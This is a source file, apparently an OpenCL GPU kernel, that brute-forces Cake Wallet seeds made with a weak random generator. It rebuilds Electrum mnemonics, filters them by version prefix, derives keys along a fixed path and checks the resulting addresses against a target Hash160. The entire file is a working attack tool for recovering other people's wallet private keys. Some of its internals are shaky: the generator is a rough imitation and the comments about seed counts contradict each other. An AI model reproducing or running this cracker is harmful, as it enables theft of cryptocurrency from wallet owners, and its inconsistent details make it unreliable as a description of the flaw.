// Cake Wallet Vulnerability GPU Cracker
// Electrum-style seed derivation with prefix validation
// Only ~1M seeds (2^20) are valid due to "100" prefix requirement

// Check if seed has valid Electrum prefix (starts with "100")
int cake_wallet_validate_electrum_prefix(__private uchar* mnemonic, int mnemonic_len) {
    // HMAC-SHA512 with key = "Seed version"
    // Check if hex output starts with "100" (bits 0001 0000 0000)
    
    uchar key[12] = {'S', 'e', 'e', 'd', ' ', 'v', 'e', 'r', 's', 'i', 'o', 'n'};
    uchar hmac_result[64] __attribute__((aligned(8)));
    
    // Simplified HMAC-SHA512 for prefix check
    uchar ipad[128] __attribute__((aligned(4)));
    uchar opad[128] __attribute__((aligned(4)));
    
    for (int i = 0; i < 128; i++) {
        ipad[i] = (i < 12) ? (key[i] ^ 0x36) : 0x36;
        opad[i] = (i < 12) ? (key[i] ^ 0x5c) : 0x5c;
    }
    
    // Inner hash: SHA512(ipad || mnemonic)
    uchar inner_data[256] __attribute__((aligned(4)));
    for (int i = 0; i < 128; i++) inner_data[i] = ipad[i];
    for (int i = 0; i < mnemonic_len; i++) inner_data[128 + i] = mnemonic[i];
    
    uchar inner_hash[64] __attribute__((aligned(8)));
    sha512((__private ulong*)inner_data, 128 + mnemonic_len, (__private ulong*)inner_hash);
    
    // Outer hash: SHA512(opad || inner_hash)
    uchar outer_data[192] __attribute__((aligned(4)));
    for (int i = 0; i < 128; i++) outer_data[i] = opad[i];
    for (int i = 0; i < 64; i++) outer_data[128 + i] = inner_hash[i];
    
    sha512((__private ulong*)outer_data, 192, (__private ulong*)hmac_result);
    
    // Check if first 12 bits are 0x100 (0001 0000 0000 in binary)
    // Hex "100" means first byte = 0x10, second byte upper nibble = 0x0
    uchar first_byte = hmac_result[0];
    uchar second_nibble = (hmac_result[1] >> 4) & 0x0F;
    
    // First byte must be 0x10, second upper nibble must be 0x0
    return (first_byte == 0x10 && second_nibble == 0x0);
}

__kernel void cake_wallet_crack(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint seed_index = gid;
    
    // Generate 17 bytes (136 bits, masked to 132) from seed index
    // Cake Wallet uses Dart Random() seeded with timestamp/seed
    uchar bytes[17] __attribute__((aligned(4))) = {0};
    
    // Simple PRNG simulation (Dart-like)
    uint state = seed_index;
    for (int i = 0; i < 17; i++) {
        // LCG similar to Dart Random
        state = state * 0x5DEECE66DUL + 0xB;
        bytes[i] = (state >> 24) & 0xFF;
    }
    
    // Mask to 132 bits (clear upper 4 bits of last byte)
    bytes[16] &= 0x0F;
    
    // Convert to Electrum mnemonic (12 words from wordlist)
    ushort word_indices[12];
    // Extract 11 bits for each of 12 words = 132 bits
    int bit_offset = 0;
    for (int w = 0; w < 12; w++) {
        int byte_idx = bit_offset / 8;
        int bit_idx = bit_offset % 8;
        
        uint bits = 0;
        bits |= ((uint)bytes[byte_idx]) << 16;
        bits |= ((uint)bytes[byte_idx + 1]) << 8;
        if (byte_idx + 2 < 17) bits |= bytes[byte_idx + 2];
        
        word_indices[w] = (bits >> (13 - bit_idx)) & 0x7FF;
        bit_offset += 11;
    }
    
    // Build mnemonic string
    uchar mnemonic[180] = {0};
    int mnemonic_len = 0;
    for (int i = 0; i < 12; i++) {
        int word_idx = word_indices[i];
        int word_length = word_lengths[word_idx];
        for (int j = 0; j < word_length; j++) {
            mnemonic[mnemonic_len++] = words[word_idx][j];
        }
        if (i < 11) mnemonic[mnemonic_len++] = ' ';
    }
    
    // Validate Electrum prefix (must start with "100")
    if (!cake_wallet_validate_electrum_prefix(mnemonic, mnemonic_len)) {
        return; // Invalid seed, skip
    }
    
    // Electrum seed derivation (PBKDF2 with "electrum" salt)
    uchar seed[64] __attribute__((aligned(8))) = {0};
    
    // PBKDF2-HMAC-SHA512 with salt="electrum", 2048 iterations
    uchar ipad_key[128] __attribute__((aligned(4)));
    uchar opad_key[128] __attribute__((aligned(4)));
    for (int x = 0; x < 128; x++) {
        ipad_key[x] = 0x36;
        opad_key[x] = 0x5c;
    }
    for (int x = 0; x < mnemonic_len; x++) {
        ipad_key[x] ^= mnemonic[x];
        opad_key[x] ^= mnemonic[x];
    }
    
    uchar salt[12] = {101, 108, 101, 99, 116, 114, 117, 109, 0, 0, 0, 1}; // "electrum" + block
    uchar sha512_result[64] __attribute__((aligned(8))) = {0};
    uchar key_previous_concat[256] __attribute__((aligned(4))) = {0};
    
    for (int x = 0; x < 128; x++) key_previous_concat[x] = ipad_key[x];
    for (int x = 0; x < 12; x++) key_previous_concat[128 + x] = salt[x];
    
    sha512((__private ulong*)key_previous_concat, 140, (__private ulong*)sha512_result);
    
    for (int x = 0; x < 128; x++) key_previous_concat[x] = opad_key[x];
    for (int x = 0; x < 64; x++) key_previous_concat[128 + x] = sha512_result[x];
    sha512((__private ulong*)key_previous_concat, 192, (__private ulong*)sha512_result);
    
    for (int x = 0; x < 64; x++) seed[x] = sha512_result[x];
    
    for (int iter = 1; iter < 2048; iter++) {
        for (int x = 0; x < 128; x++) key_previous_concat[x] = ipad_key[x];
        for (int x = 0; x < 64; x++) key_previous_concat[128 + x] = sha512_result[x];
        sha512((__private ulong*)key_previous_concat, 192, (__private ulong*)sha512_result);
        
        for (int x = 0; x < 128; x++) key_previous_concat[x] = opad_key[x];
        for (int x = 0; x < 64; x++) key_previous_concat[128 + x] = sha512_result[x];
        sha512((__private ulong*)key_previous_concat, 192, (__private ulong*)sha512_result);
        
        for (int x = 0; x < 64; x++) seed[x] ^= sha512_result[x];
    }
    
    // Derive generic path: m/0'
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);
    
    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, 0);
    
    // Check 2 chains (receive/change) and 20 indexes each = 40 checks
    // This is expensive but only runs for ~1/4096 seeds that pass prefix check
    for (uint change = 0; change <= 1; change++) {
        extended_private_key_t chain_key;
        normal_private_child_from_private(&account_key, &chain_key, change);
        
        // Optimize: Pre-calculate up to chain_key, then derive address keys
        // But for simplicity/correctness first, just loop derivation
        
        for (uint addr_idx = 0; addr_idx < 20; addr_idx++) {
            extended_private_key_t address_key;
            normal_private_child_from_private(&chain_key, &address_key, addr_idx);
            
            // Get public key
            extended_public_key_t address_pub;
            public_from_private(&address_key, &address_pub);
            
            // Generate Hash160 for P2WPKH (bc1q address)
            uchar hash160[20];
            identifier_for_public_key(&address_pub, hash160);
            
            // Pack Hash160 for comparison
            ulong h1 = 0, h2 = 0;
            uint h3 = 0;
            for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i]) << (i*8);
            for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8]) << (i*8);
            for (int i = 0; i < 4; i++) h3 |= ((uint)hash160[i+16]) << (i*8);
            
            // Compare
            if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
                uint idx = atomic_inc(result_count);
                if (idx < 1024) {
                    // Store details: seed, change, address_index
                    // Requires results array to be 3x size or pack data
                    // For now, storing flattened: results[idx * 3], etc.
                    results[idx * 3] = seed_index;
                    results[idx * 3 + 1] = change;
                    results[idx * 3 + 2] = addr_idx;
                }
            }
        }
    }
}
